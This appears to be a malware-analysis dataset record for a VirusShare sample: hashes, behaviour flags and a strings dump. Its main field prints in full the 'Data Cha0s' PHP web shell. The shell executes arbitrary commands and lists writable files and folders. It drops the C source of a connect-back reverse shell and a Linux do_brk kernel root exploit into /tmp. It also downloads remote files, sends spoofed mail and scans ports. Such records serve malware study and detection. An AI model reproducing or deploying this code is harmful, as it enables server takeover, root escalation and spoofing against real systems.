{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Binary": "May read or write a binary file",
            "Command": "May run PowerShell commands",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Run": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "call": "May call a DLL using Excel 4 Macros",
            "environ": "May read system environment variables",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "execl": "May run an executable file or a system command on a Mac",
            "kill": "May delete a file",
            "output": "May write to a file",
            "shell": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "<CENTER>\n<DIV STYLE=\"font-family: verdana; font-size: 25px; font-weight: bold; color: F3A700;\">Data Cha0s PHP Command/Safemode Exploit 4.1</DIV>\n<BR>\n<DIV STYLE=\"font-family: verdana; font-size: 20px; font-weight: bold; color: F3A700;\">System Information</DIV>\n<?php\n\n// Ae galera se forem Ripar coloca pelo menos um escrito sobre o Data Cha0s \n  closelog( );\n\n  $dono = get_current_user( );\n  $ver = phpversion( );\n  $login = posix_getuid( );\n  $euid = posix_geteuid( );\n  $gid = posix_getgid( );\n  if ($chdir == \"\") $chdir = getcwd( );\n\n?>\n<TABLE BORDER=\"0\" CELLPADDING=\"0\" CELLSPACING=\"0\">\n<?php\n\n  $uname = posix_uname( );\n  while (list($info, $value) = each ($uname)) {\n\n?>\n  <TR>\n    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\"><?= $info ?>: <?= $value ?></DIV></TD>\n  </TR>\n<?php\n  }\n?>\n \n  <TR>\n   <TR>\n    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">Script Current User: <?= $dono ?></DIV></TD>\n  </TR>\n  <TR>\n    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">PHP Version: <?= $ver ?></DIV></TD>\n  </TR>\n  <TR>\n    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">User Info: uid(<?= $login ?>) euid(<?= $euid ?>) gid(<?= $gid ?>)</DIV></TD>\n  </TR>\n  <TR>\n    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">Current Path: <?= $chdir ?></DIV></TD>\n  </TR>\n  <TR>\n    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">Server IP: <?php $aaa =  gethostbyname($SERVER_NAME);  echo $aaa;?></DIV></TD>\n  </TR>\n   <TR>\n    <TD><DIV STYLE=\"font-family: verdana; font-size: 15px;\">Web Server: <?= \"$SERVER_SOFTWARE $SERVER_VERSION\"; ?></DIV></TD>\n  </TR>\n</TABLE>\n<BR>\n<?php\n\n  if ($cmd != \"\") {\n    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Command Mode Run</DIV>\";\n\n?>\n\n<DIV STYLE=\"font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;\">Command Stdout</DIV>\n<?php\n\nif ($fe == 1){\n$fe = \"exec\";\n}\nif ($fe == \"\"){\n$fe = \"passthru\";\n}\nif ($fe == \"2\"){\n$fe = \"system\";\n}\n\n    if (isset($chdir)) @chdir($chdir);\n\n    ob_start( );\n      $fe(\"$cmd  2>&1\");\n      $output = ob_get_contents();\n    ob_end_clean( );\n\n?>\n<TEXTAREA COLS=\"75\" ROWS=\"8\" STYLE=\"font-family: verdana; font-size: 12px;\">\n<?php\n\n    if (!empty($output)) echo str_replace(\">\", \"&gt;\", str_replace(\"<\", \"&lt;\", $output));\n?>\n</TEXTAREA>\n<BR>\n<?php\n\n  }\n \n  if ($safemode != \"\") {\n    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Safemode Mode Run</DIV>\";\n\n?>\n<DIV STYLE=\"font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;\">Safe Mode Directory Listing</DIV>\n<?php\n\n    if ($dir = @opendir($chdir)) {\n      echo \"<TABLE border=1 cellspacing=1 cellpadding=0>\";\n      echo \"<TR>\";\n      echo \"<TD valign=top>\";\n      echo \"<b><font size=2 face=arial>List All Files</b> <br><br>\";\n      while (($file = readdir($dir)) !== false) {\n        if (@is_file($file)) {\n          $file1 = fileowner($file);\n          $file2 = fileperms($file);\n    \t  echo \"<font color=green>$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>\"; \n\t  // echo \"<font color=green>$file1 - $file2 - $file </font><br>\";\n          flush( );\n        }\n      }\n\n      echo \"</TD>\";\n      echo\"<TD valign=top>\";\n      echo \"<b><font size=2 face=arial>List Only Folders</b> <br><br>\";\n      if ($dir = @opendir($chdir)) {\n        while (($file = readdir($dir)) !== false) {\n          if (@is_dir($file)) {\n            $file1 = fileowner($file);\n           $file2 = fileperms($file);\n\t    echo \"<font color=blue>$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&chdir=$chdir/$file>$file</a><br>\"; \n            // echo \"<font color=blue>$file1 - $file2 - $file </font><br>\";\n          }\n        }\n      }\n      echo \"</TD>\";\n      echo\"<TD valign=top>\";\n      echo \"<b><font size=2 face=arial>List Writable Folders</b><br><br>\";\n      if ($dir = @opendir($chdir)) {\n        while (($file = readdir($dir)) !== false) {\n          if (@is_writable($file) && @is_dir($file)) {\n            $file1 = fileowner($file);\n            $file2 = fileperms($file);\n            echo \"<font color=red>$file1 - $file2 - $file </font><br>\";\n          }\n        }\n      }\n      echo \"</TD>\";\n      echo \"</TD>\";\n      echo \"<TD valign=top>\";\n      echo \"<b><font size=2 face=arial>List Writable Files</b> <br><br>\";\n \n      if ($dir = opendir($chdir)) {\n        while (($file = readdir($dir)) !== false) {\n          if (@is_writable($file) && @is_file($file)) {\n            $file1 = fileowner($file);\n            $file2 = fileperms($file);\n    \t    echo \"<font color=red>$file1 - $file2 - $file </font><br>\";\n          }\n        }\n      }\n      echo \"</TD>\";\n      echo \"</TR>\";\n      echo \"</TABLE>\";\n    }\n  }\n\n?>\n<?php\n\n  if ($shell == \"write\") {\n    $shell = \"#include <stdio.h>\\n\" .\n             \"#include <sys/socket.h>\\n\" .\n             \"#include <netinet/in.h>\\n\" .\n             \"#include <arpa/inet.h>\\n\" .\n             \"#include <netdb.h>\\n\" .\n             \"int main(int argc, char **argv) {\\n\" .\n             \"  char *host;\\n\" .\n             \"  int port = 80;\\n\" .\n             \"  int f;\\n\" .\n             \"  int l;\\n\" .\n             \"  int sock;\\n\" .\n             \"  struct in_addr ia;\\n\" .\n             \"  struct sockaddr_in sin, from;\\n\" .\n             \"  struct hostent *he;\\n\" .\n             \"  char msg[ ] = \\\"Welcome to Data Cha0s Connect Back Shell\\\\n\\\\n\\\"\\n\" .\n             \"                \\\"Issue \\\\\\\"export TERM=xterm; exec bash -i\\\\\\\"\\\\n\\\"\\n\" .\n             \"                \\\"For More Reliable Shell.\\\\n\\\"\\n\" .\n             \"                \\\"Issue \\\\\\\"unset HISTFILE; unset SAVEHIST\\\\\\\"\\\\n\\\"\\n\" .\n             \"                \\\"For Not Getting Logged.\\\\n(;\\\\n\\\\n\\\";\\n\" .\n             \"  printf(\\\"Data Cha0s Connect Back Backdoor\\\\n\\\\n\\\");\\n\" .\n             \"  if (argc < 2 || argc > 3) {\\n\" .\n             \"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" .\n             \"    return 1;\\n\" .\n             \"  }\\n\" .\n             \"  printf(\\\"[*] Dumping Arguments\\\\n\\\");\\n\" .\n             \"  l = strlen(argv[1]);\\n\" .\n             \"  if (l <= 0) {\\n\" .\n             \"    printf(\\\"[-] Invalid Host Name\\\\n\\\");\\n\" .\n             \"    return 1;\\n\" .\n             \"  }\\n\" .\n             \"  if (!(host = (char *) malloc(l))) {\\n\" .\n             \"    printf(\\\"[-] Unable to Allocate Memory\\\\n\\\");\\n\" .\n             \"    return 1;\\n\" .\n             \"  }\\n\" .\n             \"  strncpy(host, argv[1], l);\\n\" .\n             \"  if (argc == 3) {\\n\" .\n             \"    port = atoi(argv[2]);\\n\" .\n             \"    if (port <= 0 || port > 65535) {\\n\" .\n             \"      printf(\\\"[-] Invalid Port Number\\\\n\\\");\\n\" .\n             \"      return 1;\\n\" .\n             \"    }\\n\" .\n             \"  }\\n\" .\n             \"  printf(\\\"[*] Resolving Host Name\\\\n\\\");\\n\" .\n             \"  he = gethostbyname(host);\\n\" .\n             \"  if (he) {\\n\" .\n             \"    memcpy(&ia.s_addr, he->h_addr, 4);\\n\" .\n             \"  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {\\n\" .\n             \"    printf(\\\"[-] Unable to Resolve: %s\\\\n\\\", host);\\n\" .\n             \"    return 1;\\n\" .\n             \"  }\\n\" .\n             \"  sin.sin_family = PF_INET;\\n\" .\n             \"  sin.sin_addr.s_addr = ia.s_addr;\\n\" .\n             \"  sin.sin_port = htons(port);\\n\" .\n             \"  printf(\\\"[*] Connecting...\\\\n\\\");\\n\" .\n             \"  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\\n\" .\n             \"    printf(\\\"[-] Socket Error\\\\n\\\");\\n\" .\n             \"    return 1;\\n\" .\n             \"  }\\n\" .\n             \"  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {\\n\" .\n             \"    printf(\\\"[-] Unable to Connect\\\\n\\\");\\n\" .\n            \"    return 1;\\n\" .\n            \"  }\\n\" .\n             \"  printf(\\\"[*] Spawning Shell\\\\n\\\");\\n\" .\n             \"  f = fork( );\\n\" .\n             \"  if (f < 0) {\\n\" .\n             \"    printf(\\\"[-] Unable to Fork\\\\n\\\");\\n\" .\n             \"    return 1;\\n\" .\n            \"  } else if (!f) {\\n\" .\n             \"    write(sock, msg, sizeof(msg));\\n\" .\n             \"    dup2(sock, 0);\\n\" .\n             \"    dup2(sock, 1);\\n\" .\n             \"    dup2(sock, 2);\\n\" .\n             \"    execl(\\\"/bin/sh\\\", \\\"shell\\\", NULL);\\n\" .\n             \"    close(sock);\\n\" .\n             \"    return 0;\\n\" .\n             \"  }\\n\" .\n             \"  printf(\\\"[*] Detached\\\\n\\\\n\\\");\\n\" .\n             \"  return 0;\\n\" .\n             \"}\\n\";\n\n    $fp = fopen(\"/tmp/dc-connectback.c\", \"w\");\n    $ok = fwrite($fp, $shell);\n\n    if (!empty($ok)) {\n      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Connect Back Shell Was Successfuly Copied</DIV>\";\n    } else {\n      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[-] An Error Has Ocurred While Copying Shell</DIV>\";\n    }\n  }\n\n  if ($kernel == \"write\") {\n    $kernel = \"/*\\n\" .\n              \" * hatorihanzo.c\\n\" .\n              \" * Linux kernel do_brk vma overflow exploit.\\n\" .\n              \" *\\n\" .\n              \" * The bug was found by Paul (IhaQueR) Starzetz <paul@isec.pl>\\n\" .\n              \" *\\n\" .\n             \" * Further research and exploit development by\\n\" .\n              \" * Wojciech Purczynski <cliph@isec.pl> and Paul Starzetz.\\n\" .\n              \" *\\n\" .\n              \" * (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.\\n\" .\n              \" *\\n\" .\n              \" * COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE\\n\" .\n              \" * OF PRESENTED CODE IS STRICTLY PROHIBITED.\\n\" .\n              \"*/\\n\" .\n              \"#define _GNU_SOURCE\\n\" .\n              \"#include <stdio.h>\\n\" .\n              \"#include <stdlib.h>\\n\" .\n              \"#include <errno.h>\\n\" .\n              \"#include <string.h>\\n\" .\n              \"#include <unistd.h>\\n\" .\n              \"#include <fcntl.h>\\n\" .\n              \"#include <signal.h>\\n\" .\n              \"#include <paths.h>\\n\" .\n             \"#include <grp.h>\\n\" .\n             \"#include <setjmp.h>\\n\" .\n              \"#include <stdint.h>\\n\" .\n              \"#include <sys/mman.h>\\n\" .\n              \"#include <sys/ipc.h>\\n\" .\n              \"#include <sys/shm.h>\\n\" .\n              \"#include <sys/ucontext.h>\\n\" .\n              \"#include <sys/wait.h>\\n\" .\n              \"#include <asm/ldt.h>\\n\" .\n              \"#include <asm/page.h>\\n\" .\n              \"#include <asm/segment.h>\\n\" .\n             \"#include <linux/unistd.h>\\n\" .\n              \"#include <linux/linkage.h>\\n\" .\n              \"#define kB   * 1024\\n\" .\n              \"#define MB   * 1024 kB\\n\" .\n              \"#define GB   * 1024 MB\\n\" .\n              \"#define MAGIC             0xdefaced /* I should've patented this number -cliph */\\n\" .\n              \"#define ENTRY_MAGIC 0\\n\" .\n              \"#define ENTRY_GATE 2\\n\" .\n              \"#define ENTRY_CS    4\\n\" .\n              \"#define ENTRY_DS    6\\n\" .\n              \"#define CS          ((ENTRY_CS << 2) | 4)\\n\" .\n              \"#define DS          ((ENTRY_DS << 2) | 4)\\n\" .\n              \"#define GATE        ((ENTRY_GATE << 2) | 4 | 3)\\n\" .\n              \"#define LDT_PAGES   ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)\\n\" .\n              \"#define TOP_ADDR    0xFFFFE000U\\n\" .\n              \"/* configuration */\\n\" .\n              \"unsigned     task_size;\\n\" .\n              \"unsigned     page;\\n\" .\n              \"uid_t        uid;\\n\" .\n              \"unsigned     address;\\n\" .\n              \"int dontexit = 0;\\n\" .\n              \"void fatal(char * msg)\\n\" .\n              \"{\\n\" .\n              \"      fprintf(stderr, \\\"[-] %s: %s\\\\n\\\", msg, strerror(errno));\\n\" .\n              \"      if (dontexit) {\\n\" .\n              \"             fprintf(stderr, \\\"[-] Unable to exit, entering neverending loop.\\\\n\\\");\\n\" .\n              \"             kill(getpid(), SIGSTOP);\\n\" .\n              \"             for (;;) pause();\\n\" .\n              \"      }\\n\" .\n              \"      exit(EXIT_FAILURE);\\n\" .\n              \"}\\n\" .\n              \"void configure(void)\\n\" .\n              \"{\\n\" .\n              \"      unsigned val;\\n\" .\n              \"      task_size = ((unsigned)&val + 1 GB ) / (1 GB) * 1 GB;\\n\" .\n              \"      uid = getuid();\\n\" .\n              \"}\\n\" .\n              \"void expand(void)\\n\" .\n              \"{\\n\" .\n              \"      unsigned top = (unsigned) sbrk(0);\\n\" .\n              \"      unsigned limit = address + PAGE_SIZE;\\n\" .\n              \"      do {\\n\" .\n              \"             if (sbrk(PAGE_SIZE) == NULL)\\n\" .\n              \"                   fatal(\\\"Kernel seems not to be vulnerable\\\");\\n\" .\n              \"             dontexit = 1;\\n\" .\n              \"             top += PAGE_SIZE;\\n\" .\n              \"      } while (top < limit);\\n\" .\n              \"}\\n\" .\n             \"jmp_buf jmp;\\n\" .\n              \"#define MAP_NOPAGE 1\\n\" .\n              \"#define MAP_ISPAGE 2\\n\" .\n             \"void sigsegv(int signo, siginfo_t * si, void * ptr)\\n\" .\n              \"{\\n\" .\n              \"      struct ucontext * uc = (struct ucontext *) ptr;\\n\" .\n              \"      int error_code = uc->uc_mcontext.gregs[REG_ERR];\\n\" .\n              \"      (void)signo;\\n\" .\n              \"      (void)si;\\n\" .\n              \"      error_code = MAP_NOPAGE + (error_code & 1);\\n\" .\n              \"      longjmp(jmp, error_code);\\n\" .\n              \"}\\n\" .\n              \"void prepare(void)\\n\" .\n              \"{\\n\" .\n              \"      struct sigaction sa;\\n\" .\n              \"      sa.sa_sigaction = sigsegv;\\n\" .\n              \"      sa.sa_flags = SA_SIGINFO | SA_NOMASK;\\n\" .\n              \"      sigemptyset(&sa.sa_mask);\\n\" .\n              \"      sigaction(SIGSEGV, &sa, NULL);\\n\" .\n              \"}\\n\" .\n              \"int testaddr(unsigned addr)\\n\" .\n              \"{\\n\" .\n              \"      int val;\\n\" .\n              \"      val = setjmp(jmp);\\n\" .\n              \"      if (val == 0) {\\n\" .\n              \"             asm (\\\"verr (%%eax)\\\" : : \\\"a\\\" (addr));\\n\" .\n              \"             return MAP_ISPAGE;\\n\" .\n              \"      }\\n\" .\n              \"      return val;\\n\" .\n              \"}\\n\" .\n              \"#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)\\n\" .\n             \"#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))\\n\" .\n              \"#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)\\n\" .\n              \"void map(unsigned * map)\\n\" .\n              \"{\\n\" .\n              \"      unsigned addr = task_size;\\n\" .\n              \"      unsigned bit = 1;\\n\" .\n              \"      prepare();\\n\" .\n              \"      while (addr < TOP_ADDR) {\\n\" .\n              \"             if (testaddr(addr) == MAP_ISPAGE)\\n\" .\n              \"                   *map |= bit;\\n\" .\n              \"             addr += PAGE_SIZE;\\n\" .\n              \"             next(map, bit);\\n\" .\n              \"      }\\n\" .\n              \"      signal(SIGSEGV, SIG_DFL);\\n\" .\n              \"}\\n\" .\n              \"void find(unsigned * m)\\n\" .\n              \"{\\n\" .\n              \"      unsigned addr = task_size;\\n\" .\n              \"      unsigned bit = 1;\\n\" .\n             \"      unsigned count;\\n\" .\n             \"      unsigned tmp;\\n\" .\n              \"      prepare();\\n\" .\n              \"      tmp = address = count = 0U;\\n\" .\n              \"      while (addr < TOP_ADDR) {\\n\" .\n              \"             int val = testaddr(addr);\\n\" .\n              \"             if (val == MAP_ISPAGE && (*m & bit) == 0) {\\n\" .\n              \"                   if (!tmp) tmp = addr;\\n\" .\n              \"                   count++;\\n\" .\n              \"             } else {\\n\" .\n              \"                   if (tmp && count == LDT_PAGES) {\\n\" .\n              \"                          errno = EAGAIN;\\n\" .\n              \"                          if (address)\\n\" .\n              \"                                fatal(\\\"double allocation\\\\n\\\");\\n\" .\n              \"                          address = tmp;\\n\" .\n              \"                   }\\n\" .\n              \"                   tmp = count = 0U;\\n\" .\n              \"             }\\n\" .\n              \"             addr += PAGE_SIZE;\\n\" .\n              \"             next(m, bit);\\n\" .\n              \"      }\\n\" .\n              \"      signal(SIGSEGV, SIG_DFL);\\n\" .\n              \"      if (address)\\n\" .\n              \"             return;\\n\" .\n              \"      errno = ENOTSUP;\\n\" .\n              \"      fatal(\\\"Unable to determine kernel address\\\");\\n\" .\n              \"}\\n\" .\n              \"int modify_ldt(int, void *, unsigned);\\n\" .\n              \"void ldt(unsigned * m)\\n\" .\n              \"{\\n\" .\n              \"      struct modify_ldt_ldt_s l;\\n\" .\n              \"      map(m);\\n\" .\n              \"      memset(&l, 0, sizeof(l));\\n\" .\n              \"      l.entry_number = LDT_ENTRIES - 1;\\n\" .\n              \"      l.seg_32bit = 1;\\n\" .\n              \"      l.base_addr = MAGIC >> 16;\\n\" .\n              \"      l.limit = MAGIC & 0xffff;\\n\" .\n              \"      if (modify_ldt(1, &l, sizeof(l)) == -1)\\n\" .\n              \"             fatal(\\\"Unable to set up LDT\\\");\\n\" .\n              \"      l.entry_number = ENTRY_MAGIC / 2;\\n\" .\n              \"      if (modify_ldt(1, &l, sizeof(l)) == -1)\\n\" .\n              \"             fatal(\\\"Unable to set up LDT\\\");\\n\" .\n              \"      find(m);\\n\" .\n              \"}\\n\" .\n              \"asmlinkage void kernel(unsigned * task)\\n\" .\n              \"{\\n\" .\n              \"      unsigned * addr = task;\\n\" .\n              \"      /* looking for uids */\\n\" .\n              \"      while (addr[0] != uid || addr[1] != uid ||\\n\" .\n              \"             addr[2] != uid || addr[3] != uid)\\n\" .\n              \"             addr++;\\n\" .\n              \"      addr[0] = addr[1] = addr[2] = addr[3] = 0;    /* uids */\\n\" .\n              \"      addr[4] = addr[5] = addr[6] = addr[7] = 0;    /* uids */\\n\" .\n              \"      addr[8] = 0;\\n\" .\n              \"      /* looking for vma */\\n\" .\n              \"      for (addr = (unsigned *) task_size; addr; addr++) {\\n\" .\n              \"             if (addr[0] >= task_size && addr[1] < task_size &&\\n\" .\n              \"                 addr[2] == address && addr[3] >= task_size) {\\n\" .\n              \"                   addr[2] = task_size - PAGE_SIZE;\\n\" .\n              \"                   addr = (unsigned *) addr[3];\\n\" .\n              \"                   addr[1] = task_size - PAGE_SIZE;\\n\" .\n              \"                   addr[2] = task_size;\\n\" .\n              \"                   break;\\n\" .\n              \"             }\\n\" .\n              \"      }\\n\" .\n              \"}\\n\" .\n              \"void kcode(void);\\n\" .\n              \"#define __str(s) #s\\n\" .\n              \"#define str(s) __str(s)\\n\" .\n              \"void __kcode(void)\\n\" .\n              \"{\\n\" .\n              \"      asm(\\n\" .\n              \"             \\\"kcode:                                \\\\n\\\"\\n\" .\n              \"             \\\"     pusha                            \\\\n\\\"\\n\" .\n              \"             \\\"     pushl %es                        \\\\n\\\"\\n\" .\n              \"             \\\"     pushl %ds                        \\\\n\\\"\\n\" .\n              \"             \\\"     movl   $(\\\" str(DS) \\\") ,%edx      \\\\n\\\"\\n\" .\n              \"             \\\"     movl   %edx,%es                  \\\\n\\\"\\n\" .\n              \"             \\\"     movl   %edx,%ds                  \\\\n\\\"\\n\" .\n              \"             \\\"     movl   $0xffffe000,%eax          \\\\n\\\"\\n\" .\n              \"             \\\"     andl   %esp,%eax                 \\\\n\\\"\\n\" .\n              \"             \\\"     pushl %eax                       \\\\n\\\"\\n\" .\n              \"             \\\"     call   kernel                    \\\\n\\\"\\n\" .\n              \"             \\\"     addl   $4, %esp                  \\\\n\\\"\\n\" .\n              \"             \\\"     popl   %ds                       \\\\n\\\"\\n\" .\n              \"             \\\"     popl   %es                       \\\\n\\\"\\n\" .\n              \"             \\\"     popa                             \\\\n\\\"\\n\" .\n              \"             \\\"     lret                             \\\\n\\\"\\n\" .\n              \"      );\\n\" .\n              \"}\\n\" .\n              \"void knockout(void)\\n\" .\n              \"{\\n\" .\n              \"      unsigned * addr = (unsigned *) address;\\n\" .\n              \"      if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)\\n\" .\n              \"             fatal(\\\"Unable to change page protection\\\");\\n\" .\n              \"      errno = ESRCH;\\n\" .\n              \"      if (addr[ENTRY_MAGIC] != MAGIC)\\n\" .\n              \"             fatal(\\\"Invalid LDT entry\\\");\\n\" .\n              \"      /* setting call gate and privileged descriptors */\\n\" .\n              \"      addr[ENTRY_GATE+0] = ((unsigned)CS << 16) | ((unsigned)kcode & 0xffffU);\\n\" .\n              \"      addr[ENTRY_GATE+1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;\\n\" .\n              \"      addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */\\n\" .\n              \"      addr[ENTRY_CS+1] = 0x00cf9a00U;\\n\" .\n              \"      addr[ENTRY_DS+0] = 0x0000ffffU; /* user   4GB code at 0x00000000 */\\n\" .\n              \"      addr[ENTRY_DS+1] = 0x00cf9200U;\\n\" .\n              \"      prepare();\\n\" .\n              \"      if (setjmp(jmp) != 0) {\\n\" .\n              \"             errno = ENOEXEC;\\n\" .\n              \"             fatal(\\\"Unable to jump to call gate\\\");\\n\" .\n              \"      }\\n\" .\n              \"      asm(\\\"lcall $\\\" str(GATE) \\\",$0x0\\\");      /* this is it */\\n\" .\n              \"}\\n\" .\n              \"void shell(void)\\n\" .\n              \"{\\n\" .\n              \"      char * argv[] = { _PATH_BSHELL, NULL };\\n\" .\n              \"      execve(_PATH_BSHELL, argv, environ);\\n\" .\n             \"      fatal(\\\"Unable to spawn shell\\\\n\\\");\\n\" .\n             \"}\\n\" .\n              \"void remap(void)\\n\" .\n              \"{\\n\" .\n              \"      static char stack[8 MB];  /* new stack */\\n\" .\n              \"      static char * envp[] = { \\\"PATH=\\\" _PATH_STDPATH, NULL };\\n\" .\n              \"      static unsigned * m;\\n\" .\n              \"      static unsigned b;\\n\" .\n              \"      m = (unsigned *) sbrk(map_size);\\n\" .\n             \"      if (!m)\\n\" .\n             \"             fatal(\\\"Unable to allocate memory\\\");\\n\" .\n              \"      environ = envp;\\n\" .\n              \"      asm (\\\"movl %0, %%esp\\\\n\\\" : : \\\"a\\\" (stack + sizeof(stack)));\\n\" .\n              \"      b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) & PAGE_MASK;\\n\" .\n              \"      if (munmap((void*)b, task_size - b) == -1)\\n\" .\n              \"             fatal(\\\"Unable to unmap stack\\\");\\n\" .\n              \"      while (b < task_size) {\\n\" .\n              \"             if (sbrk(PAGE_SIZE) == NULL)\\n\" .\n              \"                   fatal(\\\"Unable to expand BSS\\\");\\n\" .\n              \"             b += PAGE_SIZE;\\n\" .\n              \"      }\\n\" .\n              \"      ldt(m);\\n\" .\n              \"      expand();\\n\" .\n              \"      knockout();\\n\" .\n              \"      shell();\\n\" .\n              \"}\\n\" .\n              \"int main(void)\\n\" .\n              \"{\\n\" .\n              \"      configure();\\n\" .\n              \"      remap();\\n\" .\n              \"      return EXIT_FAILURE;\\n\" .\n              \"}\\n\";\n\n    $fp = fopen(\"/tmp/xpl_brk.c\", \"w\");\n    $ok = fwrite($fp, $kernel);\n    \n    if (!empty($ok)) {\n      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Linux Local Kernel Exploit Was Successfuly Copied</DIV>\";\n    } else {\n      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[-] An Error Has Ocurred While Copying Kernel Exploit</DIV>\";\n   }\n }\n\n?>\n</CENTER>\n<pre><font face=\"Tahoma\" size=\"2\">\n<?php\n\n// Function to Visualize Source Code files \nif ($see != \"\") {\n  $fp = fopen($see, \"r\"); \n  $read = fread($fp, 30000); \n  echo \"============== $see ================<br>\";\n  echo \"<textarea name=textarea cols=80 rows=15>\"; \n  echo \"$read\"; \n  Echo \"</textarea>\"; \n}\n\n// Function to Dowload Local Xploite Binary COde or Source Code\n\nif ($dx != \"\") {\n  $fp = @fopen(\"$hostxpl\",r);\n  $fp2 = @fopen(\"$storage\",\"w\");\n  fwrite($fp2, \"\");\n  $fp1 = @fopen(\"$storage\",\"a+\");\n  for (;;) {\n    $read = @fread($fp, 4096);\n    if (empty($read)) break;\n    $ok = fwrite($fp1, $read);\n    \n    if (empty($ok)) {\n      echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[-] An Error Has Ocurred While Uploading File</DIV>\";\n      break;\n    }\n  }\n\n  if (!empty($ok)) {\n    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] File Was Successfuly Uploaded</DIV>\";\n  }\n}\n\nflush( );\n\n// Function to visulize Format Color Source Code PHP\n\nif ($sfc != \"\") {\n  $showcode = show_source(\"$sfc\");\n  echo \"<font size=4> $showcode </font>\";\n}\n\n// Function to Visualize all infomation files\nif ($fileinfo != \"\") {\n  $infofile = stat(\"$fileanalize\");\n  while (list($info, $value) = each ($infofile)) {\n    echo\" Info: $info  Value: $value <br>\";\n  }\n}\n\n// Function to send fake mail\nif ($fake == 1) {\n  echo \"<FORM METHOD=POST ACTION=\\\"$SCRIPT_NAME?$QUERY_STRING&send=1\\\">\";\n  echo \"Your Fake Mail <INPUT TYPE=\\\"\\\" NAME=\\\"yourmail\\\"><br>\";\n  echo \"Your Cavy:<INPUT TYPE=\\\"\\\" NAME=\\\"cavy\\\"><br>\";\n  echo \"Suject: <INPUT TYPE=\\\"text\\\" NAME=\\\"subject\\\"><br>\";\n  echo \"Text: <TEXTAREA NAME=\\\"body\\\" ROWS=\\\"\\\" COLS=\\\"\\\"></TEXTAREA><br>\";\n  echo \"<INPUT TYPE=\\\"hidden\\\" NAME=\\\"send\\\" VALUE=\\\"1\\\"><br>\";\n  echo \"<INPUT TYPE=\\\"submit\\\" VALUE=\\\"Send Fake Mail\\\">\";\n  echo \"</FORM>\";\n}\n\nif($send == 1) {\n  if (mail($cavy, $subject, $body, \"From: $yourmail\\r\\n\")) {\n    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[*] Mail Send Sucessfuly</DIV>\";\n  } else {\n    echo \"<DIV STYLE=\\\"font-family: verdana; font-size: 15px;\\\">[-] An Error Has Ocurred While Sending Mail</DIV>\";\n  }\n}\n\nif ($portscan != \"\") {\n  $port = array (\"21\",\"22\",\"23\",\"25\",\"110\",);\n  $values = count($port);\n  for ($cont=0; $cont < $values; $cont++) {\n    @$sock[$cont] = Fsockopen($SERVER_NAME, $port[$cont], $oi, $oi2, 1);\n    $service = Getservbyport($port[$cont],\"tcp\");\n    @$get = fgets($sock[$cont]);\n    echo \"<br>Port: $port[$cont] - Service: $service<br><br>\";\n    echo \"<br>Banner: $get <br><br>\";\n    flush();\n  }\n}\n\n?> \n</font></pre> \n\n\n"
    },
    "filename": "VirusShare_0233372aeee25ec7d8f6a7c51a644a29",
    "filesize": 26656,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "0233372aeee25ec7d8f6a7c51a644a29",
        "sha1": "0bc32c80ddee654f39193125d36b0b598110fb67",
        "sha256": "72c3ff61790983933a3db52c1e5a09b1fd2df88befbaf4de19b6ca8b235097a4"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<CENTER>",
            "<DIV STYLE=\"font-family: verdana; font-size: 25px; font-weight: bold; color: F3A700;\">Data Cha0s PHP Command/Safemode Exploit 4.1</DIV>",
            "<BR>",
            "<DIV STYLE=\"font-family: verdana; font-size: 20px; font-weight: bold; color: F3A700;\">System Information</DIV>",
            "<?php",
            "// Ae galera se forem Ripar coloca pelo menos um escrito sobre o Data Cha0s ",
            "  closelog( );",
            "  $dono = get_current_user( );",
            "  $ver = phpversion( );",
            "  $login = posix_getuid( );",
            "  $euid = posix_geteuid( );",
            "  $gid = posix_getgid( );",
            "  if ($chdir == \"\") $chdir = getcwd( );",
            "<TABLE BORDER=\"0\" CELLPADDING=\"0\" CELLSPACING=\"0\">",
            "<?php",
            "  $uname = posix_uname( );",
